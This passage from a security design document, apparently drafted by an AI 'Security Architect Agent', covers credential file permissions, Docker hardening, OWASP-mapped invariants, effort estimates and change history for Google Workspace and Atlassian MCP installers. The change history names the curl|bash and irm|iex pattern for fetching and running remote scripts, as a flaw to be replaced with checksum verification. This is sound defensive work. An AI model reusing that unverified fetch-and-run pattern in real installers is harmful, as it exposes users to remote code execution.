    fs.chmodSync(TOKEN_PATH, 0o600);
  } catch {}
}
```

**2. Installer-level (install.sh) -- First-time setup:**

```bash
# Google module installer
CONFIG_DIR="$HOME/.google-workspace"
mkdir -p "$CONFIG_DIR"
chmod 700 "$CONFIG_DIR"
# Set client_secret.json permissions after user copies it
if [ -f "$CONFIG_DIR/client_secret.json" ]; then
    chmod 600 "$CONFIG_DIR/client_secret.json"
fi

# Atlassian module installer
ENV_DIR="$HOME/.atlassian-mcp"
mkdir -p "$ENV_DIR"
chmod 700 "$ENV_DIR"
# credentials.env written with explicit permissions
cat > "$ENV_FILE" << EOF
...
EOF
chmod 600 "$ENV_FILE"

# MCP config file
chmod 600 "$HOME/.mcp.json" 2>/dev/null || true
```

**3. Docker-level (Dockerfile) -- Container enforcement:**

```dockerfile
# Non-root user owns the app directory
RUN groupadd -r mcp && useradd -r -g mcp -d /app -s /bin/false mcp
RUN chown -R mcp:mcp /app
USER mcp
```

### Credential Flow Diagram

```
                                      +------------------+
                                      | .mcp.json (0600) |
                                      | NO credentials   |
                                      | Only paths and   |
                                      | Docker commands   |
                                      +--------+---------+
                                               |
                         +---------------------+---------------------+
                         |                                           |
              +----------v-----------+                   +-----------v----------+
              | Google MCP Docker    |                   | Atlassian MCP Docker |
              | args: [..., '-v',    |                   | args: [...,          |
              |   configDir + ':/app |                   |   '--env-file',      |
              |   /.google-workspace |                   |   envFilePath, ...]  |
              |   ', ...]            |                   +----------+-----------+
              +----------+-----------+                              |
                         |                                          |
              +----------v-----------+                   +----------v-----------+
              | ~/.google-workspace/ |                   | ~/.atlassian-mcp/    |
              | (0700)               |                   | (0700)               |
              |  client_secret.json  |                   |  credentials.env     |
              |  (0600)              |                   |  (0600)              |
              |  token.json (0600)   |                   +----------------------+
              +----------------------+
```

### Key Design Decisions

1. **No credentials in `.mcp.json`:** The MCP config file references credential files by path but never contains credential values inline. This is critical because `.mcp.json` is read by the Claude CLI and may be logged, transmitted, or inspected.

2. **Separate credential directories per service:** Google and Atlassian credentials live in separate directories (`~/.google-workspace/`, `~/.atlassian-mcp/`). This allows different permission policies and makes it clear which service owns which secrets.

3. **Docker `--env-file` over `-e` flags:** For Atlassian, the `--env-file` flag passes credentials to the container through a file read, not command-line arguments. This prevents exposure in `ps aux`, `docker inspect` (for args), and `/proc/PID/cmdline`.

4. **Defensive permission healing:** Both the application (oauth.ts) and the installer (install.sh) check and correct permissions on every run. This handles the case where a user or another tool weakens permissions between runs.

5. **No encryption at rest (deferred):** Full at-rest encryption (e.g., using OS keychain or DPAPI) is deferred to Sprint 2. The file permission model provides adequate protection for the current threat model (single-user workstations). The architecture supports adding encryption later without changing the file structure.

---

## Security Invariant Summary

| Req ID | OWASP | Invariant | Verification Method |
|--------|-------|-----------|-------------------|
| FR-S1-01 | A07 | OAuth callbacks require a matching cryptographic state token | Unit test: reject callback with wrong/missing state |
| FR-S1-02 | A03 | Drive query strings cannot be broken by user input | Unit test: input with `'`, `\`, and `'or'` produces escaped query |
| FR-S1-03 | A03 | No user data is interpolated into code execution contexts | Code review: grep for `osascript`, verify no `$var` in `-e` strings |
| FR-S1-04 | A02 | Credentials are not stored in `.mcp.json` | Integration test: parse `.mcp.json`, assert no token values |
| FR-S1-06 | A05 | Container process runs as non-root | `docker exec <container> whoami` returns `mcp`, not `root` |
| FR-S1-07 | A02 | `token.json` permissions are always 0600 | `stat -f "%Lp" token.json` returns `600` |
| FR-S1-08 | A02 | Config directory permissions are always 0700 | `stat -f "%Lp" .google-workspace` returns `700` |
| FR-S1-09 | A03 | Shell variables are not interpolated into `node -e` scripts | Code review: all `node -e` scripts use only `process.env` for data |
| FR-S1-10 | A03 | Email headers cannot contain CR/LF characters | Unit test: input with `\r\n` produces sanitized output |
| FR-S1-11 | A08 | All remotely downloaded files are verified with SHA-256 checksum before execution | Integration test: Verify execution refused when tampered file downloaded |
| Security Logging | A09 | Authentication, permission change, and validation failure events are recorded as structured JSON to stderr | Log output test: Verify log output and format for each event type |

---

## Files Modified (Summary)

| File | Changes |
|------|---------|
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts` | FR-S1-01 (state param), FR-S1-07 (token permissions), FR-S1-08 (dir permissions), Security Logging (A09) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/drive.ts` | FR-S1-02 (query escaping, ID validation) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/gmail.ts` | FR-S1-10 (header sanitization) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/utils/sanitize.ts` | **NEW** -- shared validation/sanitization utilities (including Calendar, Sheets, Slides validation functions) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/index.ts` | Error handling sanitization, Security Logging |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/Dockerfile` | FR-S1-06 (non-root user, npm ci) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.sh` | FR-S1-03 (replace osascript with node stdin), **FR-S1-11** (download_and_verify, checksums.json) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.ps1` | **FR-S1-11** (Invoke-DownloadAndVerify, checksums.json) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/atlassian/install.sh` | FR-S1-04 (env file), FR-S1-09 (process.env) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/google/install.sh` | FR-S1-09 (process.env for config path) |
| `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/checksums.json` | **NEW** -- SHA-256 checksum manifest (auto-generated by CI/CD) |

---

## Sprint 1 Effort Estimate

| Req ID | Task | Hours | Notes |
|--------|------|:-----:|------|
| FR-S1-01 | OAuth state parameter + unit test | 1-2 | SEC-08 response |
| FR-S1-02 | Drive query escaping + sanitize.ts + unit tests | 2-3 | GWS-07 response |
| FR-S1-03 | Replace osascript with node stdin pipe | 3-4 | SEC-08a response |
| FR-S1-04 | Atlassian env file storage + installer changes | 4-6 | SEC-02 response |
| FR-S1-06 | Dockerfile non-root user + volume compat testing | 2-3 | SEC-05 response |
| FR-S1-07 | token.json chmod 600 + existing file migration | 1 | SEC-04 response, gap analysis D-03 reflected (increased from 0.5h) |
| FR-S1-08 | Config dir chmod 700 | 0.5 | SEC-04 related |
| FR-S1-09 | Variable escaping (atlassian + google installers) | 2-3 | SEC-12 response |
| FR-S1-10 | Gmail header injection + email validation | 1-2 | GWS-08 response |
| **FR-S1-11** | **Remote script integrity verification (checksums.json + download_and_verify)** | **6-8** | **SEC-01 response, Critical, gap analysis D-01 reflected** |
| -- | Input validation layer extension (sanitize.ts, including Calendar/Sheets/Slides) | 3-4 | Gap analysis D-02 reflected |
| -- | Security event logging (oauth.ts, index.ts) | 2-3 | OWASP A09 response, gap analysis reflected |
| -- | Integration testing across all changes | 3-4 | |
| **Total** | | **31-44 hours** | Updated from 22-33h to reflect SEC-01 + logging + validation extension |

---

## Change History

| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 1.0 | 2026-02-12 | Initial draft -- FR-S1-01~S1-10, Input Validation Layer, Credential Storage Architecture | Security Architect Agent |
| 1.1 | 2026-02-12 | Gap analysis reflection and supplement (based on gap-security-verification.md) | Security Architect Agent |

### v1.1 Change Details

**[Critical]**
- **FR-S1-11 added:** Added "Remote script download integrity verification" section in response to SEC-01. checksums.json manifest design, download_and_verify() function (Bash/PowerShell), design for replacing curl|bash/irm|iex patterns in 3 install.sh locations + 1 install.ps1 location. OWASP A08 mapping. Effort 6-8h.

**[High]**
- **Input Validation Layer extension (D-02):** Extended the Validation Coverage Matrix that previously only covered Drive/Gmail to Calendar, Docs, Sheets, Slides. Added Calendar date/time validation (validateISO8601DateTime, validateDateRange, validateDateFormat), Sheets A1 notation validation (validateA1Notation), generic newline validation (validateNoNewlines) function designs.
- **FR-S1-07 effort adjustment (D-03):** Increased from 0.5h to 1h. Reflected existing file migration (644->600) and Windows compatibility testing effort.

**[Medium]**
- **Security event logging section added:** OWASP A09 response. SecurityLogEntry interface, logSecurityEvent() function, logging design for 10 event types, 5 security logging rules defined (exclude sensitive info, exclude user input, stderr only, structured format, minimum fields).
- **SEC-03 downgrade annotation:** Explicitly recorded the fact that SEC-03 was downgraded to Informational and the reason FR-S1-05 was excluded from the design document. Added notes on out-of-scope issues SEC-06 (Sprint 2) and SEC-07 (Sprint 4).

**[Other]**
- Expanded document scope to include FR-S1-11 and Security Logging
- Added FR-S1-11, security event logging, and change history items to table of contents
- Added FR-S1-11 (A08) and security logging (A09) rows to Security Invariant Summary
- Added install.ps1 and checksums.json to Files Modified
- Updated Sprint 1 Effort Estimate total from 22-33h to 31-44h
- Added gap analysis report to References
